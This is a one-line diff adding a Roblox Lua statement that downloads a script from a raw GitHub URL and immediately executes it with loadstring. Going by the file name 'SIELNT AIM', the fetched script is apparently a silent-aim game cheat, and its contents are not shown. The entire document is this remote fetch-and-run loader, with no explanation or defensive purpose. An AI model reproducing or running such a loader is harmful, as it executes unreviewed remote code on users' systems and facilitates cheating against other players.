@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/ODI24/SPCHAT/main/SIELNT%20AIM'),true))()
